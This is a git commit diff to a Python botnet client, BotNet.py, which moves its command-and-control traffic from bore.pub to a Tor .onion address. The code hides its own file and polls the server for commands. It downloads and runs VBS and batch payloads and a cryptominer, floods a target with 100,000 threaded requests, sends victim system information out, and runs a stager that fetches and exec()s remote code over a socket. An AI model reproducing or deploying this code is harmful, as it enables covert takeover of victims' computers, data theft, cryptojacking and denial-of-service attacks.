e5862f18ad0dc3a85cc51d988b4a56ec7fcfea96
AbdulazizDXT <143551117+AzizDXT@users.noreply.github.com>
2023-10-05 22:52:35 +0400

    Update BotNet.py

--- BotNet.py
+++ BotNet.py
@@ -17,6 +17,15 @@ import struct
 import os
 import sys
 
+
+proxies = {
+    'http': 'socks5h://127.0.0.1:9150',  # Tor proxy address and port for HTTP
+    'https': 'socks5h://127.0.0.1:9150'  # Tor proxy address and port for HTTPS
+}
+
+requests_session = requests.Session()
+requests_session.proxies.update(proxies)
+
 subprocess.Popen("attrib +h BN.pyw", shell=True) 
   
 def METASPLOIT(): 
@@ -26,16 +35,18 @@ def METASPLOIT():
   
     previous_data = "" 
   
-    while True: 
-        port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
-        url = f'http://bore.pub:{port}/Metasploit.php'
-        response = requests.get(url) 
-  
-        if response.status_code == 200: 
-            data = response.text 
-            if data != previous_data: 
-             parts = data.strip().split('::')
-            if len(parts) == 2:
+    while True:
+     url = 'http://yiqcvh5ewyjhkabtexi5puj3ffs5i6ctpwd7dkqsj4g7jjb7koqxjkqd.onion/Metasploit.php'
+     time.sleep(5)
+     response = requests_session.get(url)
+
+     if response.status_code == 200:
+        data = response.text.strip()
+        if data != previous_data:
+            parts = data.strip().split('::')
+            if len(parts) == 3:
+                mac, option, target = parts
+            elif len(parts) == 2:
                 mac, option = parts
             elif len(parts) == 1:
                 mac = parts[0]
@@ -44,27 +55,28 @@ def METASPLOIT():
                 continue
 
             time.sleep(1)
- 
+            
             previous_data = data
             if mac == '':
                 if option == "STOP":
-                  def restart_program():
-                     python = sys.executable
-                     os.execl(python, python, *sys.argv)
-                  restart_program()  
+                    os.system("cls")
+                    def restart_program():
+                        python = sys.executable
+                        os.execl(python, python, *sys.argv)
+                    restart_program()
                 elif option == "STARTVBSBAT":
-                    port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
-                    php_script_url = f'http://bore.pub:{port}/Control.php'
+                    os.system("cls")
+                    php_script_url = 'http://yiqcvh5ewyjhkabtexi5puj3ffs5i6ctpwd7dkqsj4g7jjb7koqxjkqd.onion/Control.php'
                     home_directory = os.path.expanduser("~")
                     web_page1_path = os.path.join(home_directory, "Script.bat")
                     vbs_file_path = os.path.join(home_directory, "VBSEX.vbs")
 
                     for file_path in [web_page1_path, vbs_file_path]:
-                       if os.path.exists(file_path):
-                           os.remove(file_path)
+                        if os.path.exists(file_path):
+                            os.remove(file_path)
 
-                    url1 = f"http://bore.pub:{port}/Script.io"
-                    url2 = f"http://bore.pub:{port}/VBSEX.io"
+                    url1 = "http://yiqcvh5ewyjhkabtexi5puj3ffs5i6ctpwd7dkqsj4g7jjb7koqxjkqd.onion/Script.io"
+                    url2 = "http://yiqcvh5ewyjhkabtexi5puj3ffs5i6ctpwd7dkqsj4g7jjb7koqxjkqd.onion/VBSEX.io"
 
                     download_file(url1, web_page1_path)
                     download_file(url2, vbs_file_path)
@@ -75,55 +87,77 @@ def METASPLOIT():
                         hide_files_unix([web_page1_path, vbs_file_path])
 
                     if os.path.isfile(vbs_file_path):
-                      subprocess.Popen(['cscript.exe', vbs_file_path], shell=True)
+                        subprocess.Popen(['cscript.exe', vbs_file_path], shell=True)
                 elif option == "MINING":
-                      ports_to_try = [61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012]
-                      random.shuffle(ports_to_try)  
-    
-                      for port in ports_to_try:
-                        url = f"http://bore.pub:{port}/Mining.exe"
-                        download_file(url, web_page_path)
-                        web_page_path = os.path.join(home_directory, "Mining.exe")
-                        if os.path.isfile(web_page_path):
-                            subprocess.Popen(['cscript.exe', web_page_path], shell=True)
+                    os.system("cls")
+                    url = "http://yiqcvh5ewyjhkabtexi5puj3ffs5i6ctpwd7dkqsj4g7jjb7koqxjkqd.onion/Mining.exe"
+                    download_file(url, web_page_path)
+                    web_page_path = os.path.join(home_directory, "Mining.exe")
+                    if os.path.isfile(web_page_path):
+                        subprocess.Popen(['cscript.exe', web_page_path], shell=True)
+                elif option == "DDOS":
+                    os.system("cls")
+                    import requests
+                    import threading
+                    requests_per_second = 100000
+                    def send_requests():
+                        try:
+                           response = requests.get(target)
+                           if response.status_code == 200:
+                               pass
+                        except Exception as e:
+                               pass
+
+                    threads = []
+                    for _ in range(requests_per_second):
+                        thread = threading.Thread(target=send_requests)
+                        threads.append(thread)
+                        thread.start()
+
+                    for thread in threads:
+                     thread.join()
+
 
             if mac == actual_mac:
+
                 if option == "START":
+                    os.system("cls")
                     def run_specific_code():
-                     import socket, zlib, base64, struct, time, random
+                        import socket, zlib, base64, struct, time, random
 
-                     while True:
-                        ports_to_try = [61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012]
-                        random.shuffle(ports_to_try)  
-    
-                        for port in ports_to_try:
-                            try:
-                               s = socket.socket(2, socket.SOCK_STREAM)
-                               s.connect(('bore.pub', port))
-            
-                               l = struct.unpack('>I', s.recv(4))[0]
-                               d = s.recv(1)
-                               while len(d) < l:
-                                   d += s.recv(l - len(d))
+                        while True:
+                            ports_to_try = [61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012]
+                            random.shuffle(ports_to_try)
 
-                               exec(zlib.decompress(base64.b64decode(d)), {'s': s})
+                            for port in ports_to_try:
+                                try:
+                                    s = socket.socket(2, socket.SOCK_STREAM)
+                                    s.connect(('bore.pub', port))
 
-                            except Exception as e:
-                               print(f"{e}")
-                            finally:
-                             s.close()
-        
-                            if 's' in locals():
-                               break  
-                           
+                                    l = struct.unpack('>I', s.recv(4))[0]
+                                    d = s.recv(1)
+                                    while len(d) < l:
+                                        d += s.recv(l - len(d))
+
+                                    exec(zlib.decompress(base64.b64decode(d)), {'s': s})
+
+                                except Exception as e:
+                                    print(f"{e}")
+                                finally:
+                                    s.close()
+
+                                if 's' in locals():
+                                    break
+
                     specific_code_thread = threading.Thread(target=run_specific_code)
-                    specific_code_thread.daemon = True  
+                    specific_code_thread.daemon = True
                     specific_code_thread.start()
                 elif option == "STOP":
+                    os.system("cls")
                     def restart_program():
-                     python = sys.executable
-                     os.execl(python, python, *sys.argv)
-                    restart_program() 
+                        python = sys.executable
+                        os.execl(python, python, *sys.argv)
+                    restart_program()
                 else:
                     print("Invalid command:", option)
             else:
@@ -132,7 +166,6 @@ def METASPLOIT():
             print("No new data.")
     else:
         print("Failed to fetch data.")
-
     time.sleep(1)
 
 
@@ -161,7 +194,7 @@ def send_data_to_url(url, data):
 
 def download_file(url, save_path):
     try:
-        response = requests.get(url)
+        response = requests_session.get(url)
         if response.status_code == 200:
             with open(save_path, "wb") as file:
                 file.write(response.content)
@@ -217,6 +250,20 @@ def get_system_info():
             "Ram": f"{ram}",
             "Machine": f"{mach}",
         }
+        proxies = {
+    'http': 'socks5h://127.0.0.1:9150',
+    'https': 'socks5h://127.0.0.1:9150'
+}
+
+
+# قم بتكوين requests لاستخدام البروكسي
+        session = requests.Session()
+        session.proxies = proxies
+
+        url = "http://yiqcvh5ewyjhkabtexi5puj3ffs5i6ctpwd7dkqsj4g7jjb7koqxjkqd.onion/Save.php"
+        data = data_to_send
+        response = session.post(url, data=data)
+        print(response.text)
 
         return data_to_send
 
@@ -230,10 +277,9 @@ while True:
             global previous_command, previous_files
 
             while True:
-                port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
-                php_script_url = f'http://bore.pub:{port}/Control.php'
+                php_script_url = f'http://yiqcvh5ewyjhkabtexi5puj3ffs5i6ctpwd7dkqsj4g7jjb7koqxjkqd.onion/Control.php'
                 
-                response = requests.get(php_script_url)
+                response = requests_session.get(php_script_url)
                 data = response.text.strip()
 
                 if data != "" and data != previous_command:
@@ -262,18 +308,18 @@ while True:
         receive_thread.start()
 
         time.sleep(1)  
+          
 
 
         data_to_send = get_system_info()
         if data_to_send:
-            portx = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
-            php_urls = [f"http://bore.pub:{portx}/Save.php"]
+            php_urls = [""]
 
             with concurrent.futures.ThreadPoolExecutor() as executor:
                 results = executor.map(lambda url: send_data_to_url(url, data_to_send), php_urls)
 
             for result in results:
-                print(result)
+                print()
 
     except Exception as e:
         print(f"Error: {str(e)}")
